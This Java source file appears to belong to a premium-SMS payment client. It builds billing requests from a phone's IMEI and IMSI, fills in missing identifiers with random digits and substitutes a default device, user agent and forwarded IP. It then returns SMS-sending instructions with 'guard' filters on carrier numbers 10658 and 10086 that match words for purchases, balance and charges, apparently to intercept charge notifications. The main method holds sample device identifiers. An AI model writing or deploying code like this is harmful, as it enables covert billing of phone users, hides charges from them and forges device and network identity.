package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.commons.httpclient.NameValuePair;
import org.apache.log4j.Logger;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.Constants;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.PostData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;

public class ZztFmmDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(ZztFmmDynamicService.class);
	
	private static final String TYPE = "zztFmm";
	
	private static final String REQUESTMODEL = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><request><channelID>{channelId}</channelID><imei>{imei}</imei><imsi>{imsi}</imsi><UA_NAME>{ua}</UA_NAME><serviceID>{serviceId}</serviceID><consumeCode>{consumeCode}</consumeCode></request>";
	
	private static final int DEFAULTSUCCESSTIMEOUT = 2;
	
	private int timeOut = 60;
	
	private String defaultIp = "115.28.52.43";
	private String defaultUa = "NokiaN73";
	
	private static final Guard guard1 = new Guard("10658", "无法|稍后", 2880, "-1", 0);
	private static final Guard guard2 = new Guard("10658","处理|等候",2880,"0",0);
	private static final Guard guard6 = new Guard("10658800","成功|购买",1440,"1",0);
	private static final Guard guard3 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard4 = new Guard("10658","",960,null,1);
	private static final Guard guard5 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String mobileId = map.get("mobileId");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(mobileId);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(mobileId,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(mobileId);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			
			if(imsi.length() == 0){
				imsi = "46000115310";
			}
			
			imsi = fillImei(imsi);
			
			String param = REQUESTMODEL.replace("{imsi}", imsi);
			
			String imei = StringUtils.defaultString(map.get("imei"));
			
			imei = imei.replaceAll("[a-zA-Z]","1");
			
			imei = fillImei(imei);
			
			param = param.replace("{imei}", imei);
			
			param = param.replace("{channelId}", map.get("channelId"));
			param = param.replace("{serviceId}", map.get("serviceId"));
			param = param.replace("{consumeCode}", map.get("consumeCode"));
			
			String ua = map.get("ua");
			
			if(ua == null || ua.length() == 0){
				ua = defaultUa;
			}
			
			param = param.replace("{ua}",ua);
						
			logger.info("dynamic : "+url+";"+param);
			
			List<NameValuePair> pairs = new ArrayList<NameValuePair>();
			
			String ip = map.get(Constants.IPPARAM);
			
			if(ip == null || ip.length() == 0){
				ip = defaultIp;
			}
			
			pairs.add(new NameValuePair("remote-host-c", ip));
			
			String responseXml = new PostData().PostData(param.getBytes(), url,pairs);
			logger.info("dynamic response xml : "+responseXml);
			
			if(responseXml != null && responseXml.length() > 0 && !"null".equals(responseXml)){
				
				tryMap.remove(mobileId);
				
				try{
					xml = parseXml(map,responseXml);
				}catch(Exception e){
					e.printStackTrace();
					
					return DynamicUtils.parseError("597");
				}
			}else{
				logger.info("responseXml is null");
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}
	
	private String parseXml(Map<String, String> map,String data){
		
		if(data != null && data.length() > 0){
			String resultCode = SingleXmlUtil.getNodeValue(data, "resultCode");
		
			if("200".equals(resultCode)){
				String sendNumber = SingleXmlUtil.getNodeValue(data, "sendNumber");
				String sendContent = SingleXmlUtil.getNodeValue(data, "sendContent");
				
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(sendContent);
				sms.setSmsDest(sendNumber);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
				
				guardList.add(guard6);
				guardList.add(guard3);
				guardList.add(guard4);
				guardList.add(guard5);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return null;
	}
	
	private String fillImei(String imei){
		if(imei.length() < 15){
			int len = imei.length();
			
			for(int i = 0 ; i < 15 - len ; i ++){
				imei += new Random().nextInt(10);
			}
		}
		
		return imei;
	}
	
	public void setTimeOut(int timeOut) {
		this.timeOut = timeOut;
	}

	public void setDefaultIp(String defaultIp) {
		this.defaultIp = defaultIp;
	}

	public static void main(String[] args){
//		url=http://g.fmmgame.net:8097/cmccfmm/fmmpay&type=zztFmm&mobileId=6782539&imei=869828000134571&imsi=460027808117353&channelId=270&serviceId=140820001&consumeCode=30000831362601
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("imsi", "460027808117353");
		map.put("imei", "869828000134571");
		map.put("mobileId", "6782539");
		map.put("channelId","270");
		map.put("url","http://g.fmmgame.net:8097/cmccfmm/fmmpay");
		map.put("serviceId", "140820001");
		map.put("consumeCode", "30000831362601");
		
		System.out.println(new ZztFmmDynamicService().dynamic(map));
	}
}
